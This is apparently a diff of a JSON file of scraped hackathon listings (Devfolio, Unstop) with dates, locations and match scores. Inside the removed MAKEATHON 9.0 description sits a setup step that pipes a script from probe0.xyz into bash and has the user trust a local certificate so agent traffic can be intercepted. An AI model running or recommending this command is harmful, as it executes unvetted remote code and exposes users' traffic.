-      "description": "Now in its ninth edition, **MAKEATHON 9.0** is the flagship hackathon of the Microsoft Learn Student Chapter. It brings together developers, designers, and problem solvers from across the country to turn ideas into working solutions. Through workshops, mentorship, and a focused 24-hour building experience, participants will explore real-world challenges and demonstrate what they can create together.\n\n**Who can participate?**\n\nUndergraduate and postgraduate students from all colleges, academic years, and disciplines are welcome. Teams can include students from different colleges and disciplines. A mix of skills in development, design, AI/ML, and databases is encouraged.\n\nEach team must choose one problem statement from the officially released list and build a solution that directly addresses it.\n\n**Round 1 — Online Screening**\n\nTeams must submit:\n\n- A project proposal explaining the problem, proposed solution, technical approach, and expected impact.\n- An implementation plan outlining how the solution will be developed.\n\nSubmissions will be evaluated on innovation, relevance, feasibility, and clarity. Shortlisted teams will advance to the on-campus hackathon.\n\n**Round 2 — On-Campus Hackathon**\n\nShortlisted teams will develop a functional prototype from scratch during the hackathon. Pre-built solutions or prototypes are not permitted, and physical attendance throughout the hackathon is compulsory.\n\nJudges will conduct periodic progress checkpoints, followed by a final evaluation.\n\n**Final Submission**\n\nEach team must provide:\n\n- A functional prototype with a live demonstration.\n- A GitHub repository containing the source code.\n- A project presentation with at least seven slides.\n- Project documentation.\n\nFinal evaluation will consider innovation, technical implementation, practicality, cost efficiency, and overall impact.\n\n**Participation Guidelines**\n\n- Register through the official platform using accurate participant details.\n- Work on only one official problem statement.\n- Submit original work. Plagiarism will result in disqualification.\n- Demonstrate your own understanding of the project and avoid AI-generated presentation content.\n- Join the official event community and follow the Code of Conduct.\n- Violations of event rules may result in disqualification. Judges’ decisions are final and binding.\n\n## Hackathon Resources\n\n**[Access Langfuse Coding agent here all free!](https://langfuse.com/)**\n**Langfuse coupon code:** LF-NONPROFIT-X5MSL\n\n**Probe0 setup documentation for Mac:**\n1. Open Terminal and run: curl -fsSL https://probe0.xyz/i/h-makeathon | bash\n2. Sign in once when asked, and enter the Mac password once. That trusts a local certificate, which is how probe0 sees the agent traffic.\n3. Open a new terminal and use Claude Code or Codex as usual. The probe0 dashboard shows what every call used.\n4. Nothing leaves the machine, and running probe0 uninstall removes everything.\n\nDemo [Link](https://drive.google.com/file/d/1zrEUf4iqlpyQarQhjkDI-3PLA29mAB2Y/view?usp=sharing) for Probe0 Setup\n\nThere is also a Mac app download [here](https://probe0.xyz/betaInstall)",
-      "dates": "2027-01-30 to 2027-01-31",
-      "location": "Thapar Institute of Engineering & Technology, Bhadson Road, Patiala, Punjab, India",
-      "is_online": false,
-      "prizes": "Prize pool & perks listed on site",
-      "url": "https://makeathon-9.devfolio.co",
-      "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973969+00:00",
-      "match_score": 95,
-      "matching_skills": [
-        "AI",
-        "HACK",
-        "CODE",
         "INNOVAT"
       ]
     },
@@ -885,7 +953,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://hacktu-8.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973972+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733393+00:00",
       "match_score": 95,
       "matching_skills": [
         "AI",
@@ -895,43 +963,22 @@
       ]
     },
     {
-      "id": "devfolio_8b69c2039a8d4b4085c3869b9b25d9c9",
-      "name": "Lean In Hacks 8.0",
-      "platform": "Devfolio",
-      "tagline": "Lean In IGDTUW's Flagship Hackathon",
-      "description": "> Lean In Hacks is an **annual flagship hackathon of Lean In IGDTUW** - the first chapter of Lean In India. \n\n\nLean In Hacks is a **beginner-friendly hackathon** and has a place for everyone wanting to learn, build, share, and grow in their lives through their unique ideas.\n\nOur hackathon journey started in 2020 when we conducted the first edition of Lean In Hacks to give grounds to new thoughts and tools to animate the imaginative and critical thinking side of developers. \n\nThis time, **hackers from any college** can participate in our hackathon, which will be held in **hybrid mode**. The only requirement is to have **at least 1 female in your team**!\n\nHackers will be given the **weekend to build their product online** and the **top teams will be given a chance to pitch in the offline mode**.\n\n**Themes**:\n1. Open Innovation\n2. Sustainable Development Goals\n3. Emerging Technologies\n\n\nAs a beginner-friendly hackathon, we offer a dedicated **Beginner’s Track** exclusively for first-time hackers. This track is designed as an **ideathon** for **first-year students**, aimed at fostering innovative thinking, creativity, and confidence in problem-solving.",
-      "dates": "2026-11-19 to 2026-11-22",
-      "location": "In-Person",
-      "is_online": false,
-      "prizes": "Prize pool & perks listed on site",
-      "url": "https://lean-in-hacks-8.devfolio.co",
-      "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649913+00:00",
-      "match_score": 85,
+      "id": "unstop_1811526",
+      "name": "CircuitX",
+      "platform": "Unstop",
+      "tagline": "Organized by BMS Institute of Technology and Management (BMSITM), Bangalore",
+      "description": "Hackathon hosted by BMS Institute of Technology and Management (BMSITM), Bangalore",
+      "dates": "Deadline: 2026-11-30 (10 days left)",
+      "location": "Online / Campus",
+      "is_online": true,
+      "prizes": "Prizes Available",
+      "url": "https://unstop.com/hackathons/circuitx-bms-institute-of-technology-and-management-bmsitm-bangalore-1811526",
+      "source": "Unstop API",
+      "fetched_at": "2026-11-19T22:22:53.238213+00:00",
+      "match_score": 95,
       "matching_skills": [
-        "AI",
         "HACK",
-        "INNOVAT"
-      ]
-    },
-    {
-      "id": "devfolio_931ca9149c46417bb0526ce1eb44b920",
-      "name": "MakerSpark",
-      "platform": "Devfolio",
-      "tagline": "",
-      "description": "**MakerSpark** is an 8-hour hardware-only hackathon organized by the **IEEE Sensors Council Kerala Chapter**, in collaboration with **Arduino, Maker Village, and Semicon Keralam**. Hosted at the **Indian Institute of Information Technology and Management–Kerala (IIITM-K), Technopark, Thiruvananthapuram**, the event brings together aspiring innovators, engineers, and technology enthusiasts to transform creative ideas into impactful hardware solutions.",
-      "dates": "2026-12-09 to 2026-12-09",
-      "location": "IIITMK Building, Technopark Road, Technopark Campus, Karyavattom, Kazhakkoottam, Thiruvananthapuram, Keralam, India",
-      "is_online": false,
-      "prizes": "Prize pool & perks listed on site",
-      "url": "https://makerspark.devfolio.co",
-      "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649946+00:00",
-      "match_score": 85,
-      "matching_skills": [
-        "HARDWARE",
-        "HACK",
-        "INNOVAT"
+        "Acharya Campus / Bengaluru"
       ]
     },
     {
@@ -946,12 +993,32 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://chiangmai.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649962+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300144+00:00",
       "match_score": 85,
       "matching_skills": [
         "AI",
         "WEB",
         "HACK"
+      ]
+    },
+    {
+      "id": "devfolio_1c7af64a076f43d5a088b7b65ae793a3",
+      "name": "GOA BUILDATHON 27",
+      "platform": "Devfolio",
+      "tagline": "36 hours. Goa, India.",
+      "description": "# All That You Need to Know About GOA BUILDATHON ’27\n\nWelcome to **GOA BUILDATHON ’27!**\n\n> Where ambition meets execution.\n\nEvery great innovation starts with an idea. What makes it great is the courage to build it, the curiosity to experiment, and the determination to bring it to life.\n\n**GOA BUILDATHON ’27** is a **36-hour, student-run hackathon** where aspiring technologists, creative thinkers, and problem-solvers come together to turn bold ideas into tangible products.\n\nIt’s a space to push boundaries, collaborate with like-minded innovators, experiment with emerging technologies, and build something that goes beyond the ordinary.\n\nSet against the backdrop of **Goa, India**, expect an immersive build sprint filled with late-night coding, spontaneous collaborations, fresh ideas, and connections that last long after the final commit. And, of course, a little coastal magic along the way. 🌴\n\n## What Awaits You?\n\n- **₹10,00,000+ Prize Pool** — Compete, innovate, and get rewarded for what you build.\n- **Exciting Challenges** — Tackle real-world problems and explore new possibilities.\n- **36 Hours of Building** — Turn your ideas into working prototypes.\n- **A Community of Innovators** — Connect with developers, designers, and ambitious builders.\n- **A Platform to Showcase** — Put your creativity, technical skills, and ideas in the spotlight.\n\n> **Don't just imagine what’s possible. Build it.**\n\nWhether you're a first-time hacker or an experienced developer, GOA BUILDATHON ’27 is your opportunity to experiment, collaborate, and create something meaningful.\n\n**36 HOURS. ONE GOAL. BUILD SOMETHING THAT MATTERS.**\n\n*More details coming soon. Stay tuned!*",
+      "dates": "2027-01-16 to 2027-01-17",
+      "location": "Goa, India",
+      "is_online": false,
+      "prizes": "Prize pool & perks listed on site",
+      "url": "https://goa-buildathon.devfolio.co",
+      "source": "Devfolio API",
+      "fetched_at": "2026-11-19T22:22:51.300161+00:00",
+      "match_score": 85,
+      "matching_skills": [
+        "AI",
+        "HACK",
+        "INNOVAT"
       ]
     },
     {
@@ -966,7 +1033,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://devnexus-3.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973974+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733395+00:00",
       "match_score": 85,
       "matching_skills": [
         "AI",
@@ -986,7 +1053,7 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://hack-nexus.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.649968+00:00",
+      "fetched_at": "2026-11-19T22:22:51.300152+00:00",
       "match_score": 75,
       "matching_skills": [
         "HACK",
@@ -1005,10 +1072,86 @@
       "prizes": "Prize pool & perks listed on site",
       "url": "https://woc6.devfolio.co",
       "source": "Devfolio API",
-      "fetched_at": "2026-11-18T22:14:40.973944+00:00",
+      "fetched_at": "2026-11-19T22:22:51.733363+00:00",
       "match_score": 75,
       "matching_skills": [
         "AI",
+        "CODE"
+      ]
+    },
+    {
+      "id": "unstop_1817757",
+      "name": "Nurn 2026 – National Innovation & Technology Challenge",
+      "platform": "Unstop",
+      "tagline": "Organized by Pranveer Singh Institute of Technology (PSIT), Kanpur",
+      "description": "Hackathon hosted by Pranveer Singh Institute of Technology (PSIT), Kanpur",
+      "dates": "Deadline: 2026-12-16 (25 days left)",
+      "location": "Online / Campus",
+      "is_online": true,
+      "prizes": ", , ",
+      "url": "https://unstop.com/hackathons/nurn-2026-national-innovation-technology-challenge-pranveer-singh-institute-of-technology-psit-kanpur-1817757",
+      "source": "Unstop API",
+      "fetched_at": "2026-11-19T22:22:53.238189+00:00",
+      "match_score": 75,
+      "matching_skills": [
+        "HACK",
+        "INNOVAT"
+      ]
+    },
+    {
+      "id": "unstop_1814270",
+      "name": "SustainIQ",
+      "platform": "Unstop",
+      "tagline": "Organized by Vidyavardhaka College of Engineering, Mysore",
+      "description": "Hackathon hosted by Vidyavardhaka College of Engineering, Mysore",
+      "dates": "Deadline: 2026-11-23 (3 days left)",
+      "location": "Online / Campus",
+      "is_online": true,
+      "prizes": ", , , , , , , , , , , , ",
+      "url": "https://unstop.com/hackathons/sustainiq-vidyavardhaka-college-of-engineering-mysore-1814270",
+      "source": "Unstop API",
+      "fetched_at": "2026-11-19T22:22:53.238197+00:00",
+      "match_score": 75,
+      "matching_skills": [
+        "AI",
+        "HACK"
+      ]
+    },
+    {
+      "id": "unstop_1817737",
+      "name": "CodeWarriors India 2026 - National Hackathon",
+      "platform": "Unstop",
+      "tagline": "Organized by BuildX",
+      "description": "Hackathon hosted by BuildX",
+      "dates": "Deadline: 2026-12-03 (13 days left)",
+      "location": "Online / Campus",
+      "is_online": true,
+      "prizes": ", , , , ",
+      "url": "https://unstop.com/hackathons/codewarriors-india-2026-national-hackathon-buildx-1817737",
+      "source": "Unstop API",
+      "fetched_at": "2026-11-19T22:22:53.238227+00:00",
+      "match_score": 75,
+      "matching_skills": [
+        "HACK",
+        "CODE"
+      ]
+    },
+    {
+      "id": "unstop_1817736",
+      "name": "Code Fort 2027",
+      "platform": "Unstop",
+      "tagline": "Organized by Chandigarh University (CU), Ajitgarh, Punjab",
+      "description": "Hackathon hosted by Chandigarh University (CU), Ajitgarh, Punjab",
+      "dates": "Deadline: 2026-11-24 (3 days left)",
+      "location": "Online / Campus",
+      "is_online": true,
+      "prizes": "Prizes Available",
+      "url": "https://unstop.com/hackathons/code-fort-2027-chandigarh-university-cu-ajitgarh-punjab-1817736",
+      "source": "Unstop API",
+      "fetched_at": "2026-11-19T22:22:53.238230+00:00",
+      "match_score": 75,
+      "matching_skills": [
+        "HACK",
         "CODE"
       ]
     },
@@ -1018,153 +1161,20 @@
       "platform": "Unstop",
       "tagline": "Organized by Siddaganga Institute of Technology (SIT), Tumkur",
       "description": "Hackathon hosted by Siddaganga Institute of Technology (SIT), Tumkur",
-      "dates": "Deadline: 2026-11-24 (5 days left)",
+      "dates": "Deadline: 2026-11-24 (4 days left)",
       "location": "Online / Campus",
       "is_online": true,
       "prizes": "Prizes Available",
       "url": "https://unstop.com/hackathons/wie-code-2k26-siddaganga-institute-of-technology-sit-tumkur-1817696",
       "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.433939+00:00",
+      "fetched_at": "2026-11-19T22:22:53.238237+00:00",
       "match_score": 75,
       "matching_skills": [
         "HACK",
         "CODE"
-      ]
-    },
-    {
-      "id": "unstop_1817389",
-      "name": "PromptWars x Quad Bengaluru",
-      "platform": "Unstop",
-      "tagline": "Organized by Quad AI School of Technology & Management",
-      "description": "Hackathon hosted by Quad AI School of Technology & Management",
-      "dates": "Deadline: 2026-12-04 (15 days left)",
-      "location": "Online / Campus",
-      "is_online": true,
-      "prizes": ", , ",
-      "url": "https://unstop.com/hackathons/promptwars-x-quad-bengaluru-quad-ai-school-of-technology-management-1817389",
-      "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.433962+00:00",
-      "match_score": 75,
-      "matching_skills": [
-        "AI",
-        "HACK"
-      ]
-    },
-    {
-      "id": "unstop_1817798",
-      "name": "AI Kaushal Hackathon 2026",
-      "platform": "Unstop",
-      "tagline": "Organized by Indian Institute of Information Technology (IIIT), Lucknow",
-      "description": "Hackathon hosted by Indian Institute of Information Technology (IIIT), Lucknow",
-      "dates": "Deadline: 2026-11-20 (1 days left)",
-      "location": "Online / Campus",
-      "is_online": true,
-      "prizes": ", , , , ",
-      "url": "https://unstop.com/hackathons/ai-kaushal-hackathon-2026-indian-institute-of-information-technology-iiit-lucknow-1817798",
-      "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.433970+00:00",
-      "match_score": 75,
-      "matching_skills": [
-        "AI",
-        "HACK"
-      ]
-    },
-    {
-      "id": "unstop_1817749",
-      "name": "CodeUnited India - National Hackathon",
-      "platform": "Unstop",
-      "tagline": "Organized by HackWithPune",
-      "description": "Hackathon hosted by HackWithPune",
-      "dates": "Deadline: 2026-12-02 (13 days left)",
-      "location": "Online / Campus",
-      "is_online": true,
-      "prizes": ", , , ",
-      "url": "https://unstop.com/hackathons/codeunited-india-national-hackathon-hackwithpune-1817749",
-      "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.433973+00:00",
-      "match_score": 75,
-      "matching_skills": [
-        "HACK",
-        "CODE"
-      ]
-    },
-    {
-      "id": "unstop_1794480",
-      "name": "Srujana AI 2026 Hackathon (Batch 3)",
-      "platform": "Unstop",
-      "tagline": "Organized by Biorad Medisys Private Limited",
-      "description": "Hackathon hosted by Biorad Medisys Private Limited",
-      "dates": "Deadline: 2026-11-19 (Ended)",
-      "location": "Online / Campus",
-      "is_online": true,
-      "prizes": ", ",
-      "url": "https://unstop.com/hackathons/srujana-ai-2026-hackathon-batch-3-biorad-medisys-private-limited-1794480",
-      "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.433994+00:00",
-      "match_score": 75,
-      "matching_skills": [
-        "AI",
-        "HACK"
-      ]
-    },
-    {
-      "id": "unstop_1811349",
-      "name": "OpenCode 2026",
-      "platform": "Unstop",
-      "tagline": "Organized by Indian Institute of Information Technology (IIIT), Allahabad",
-      "description": "Hackathon hosted by Indian Institute of Information Technology (IIIT), Allahabad",
-      "dates": "Deadline: 2026-12-13 (24 days left)",
-      "location": "Online / Campus",
-      "is_online": true,
-      "prizes": ", , ",
-      "url": "https://unstop.com/hackathons/opencode-2026-opencode-indian-institute-of-information-technology-iiit-allahabad-1811349",
-      "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.433999+00:00",
-      "match_score": 75,
-      "matching_skills": [
-        "HACK",
-        "CODE"
-      ]
-    },
-    {
-      "id": "unstop_1810370",
-      "name": "Code Relay 5.0",
-      "platform": "Unstop",
-      "tagline": "Organized by Indian Institute of Technology (IIT), Bhubaneswar",
-      "description": "Hackathon hosted by Indian Institute of Technology (IIT), Bhubaneswar",
-      "dates": "Deadline: 2026-12-12 (23 days left)",
-      "location": "Online / Campus",
-      "is_online": true,
-      "prizes": ", , , , , , , ",
-      "url": "https://unstop.com/hackathons/code-relay-50-indian-institute-of-technology-iit-bhubaneswar-1810370",
-      "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.434003+00:00",
-      "match_score": 75,
-      "matching_skills": [
-        "HACK",
-        "CODE"
-      ]
-    },
-    {
-      "id": "unstop_1792152",
-      "name": "Agri-Tech Hackathon 2027: 24 Hours to Hack the Harvest",
-      "platform": "Unstop",
-      "tagline": "Organized by K. J. Somaiya College of Engineering (KJSCE), Vidyavihar",
-      "description": "Hackathon hosted by K. J. Somaiya College of Engineering (KJSCE), Vidyavihar",
-      "dates": "Deadline: 2026-12-15 (26 days left)",
-      "location": "Online / Campus",
-      "is_online": true,
-      "prizes": ", , ",
-      "url": "https://unstop.com/hackathons/agri-tech-hackathon-2027-24-hours-to-hack-the-harvest-k-j-somaiya-college-of-engineering-kjsce-vidyavihar-1792152",
-      "source": "Unstop API",
-      "fetched_at": "2026-11-18T22:14:42.434005+00:00",
-      "match_score": 75,
-      "matching_skills": [
-        "AI",
-        "HACK"
       ]
     }
   ],
-  "all_scored_jobs_count": 163,
+  "all_scored_jobs_count": 166,
   "all_scored_hackathons_count": 48
 }
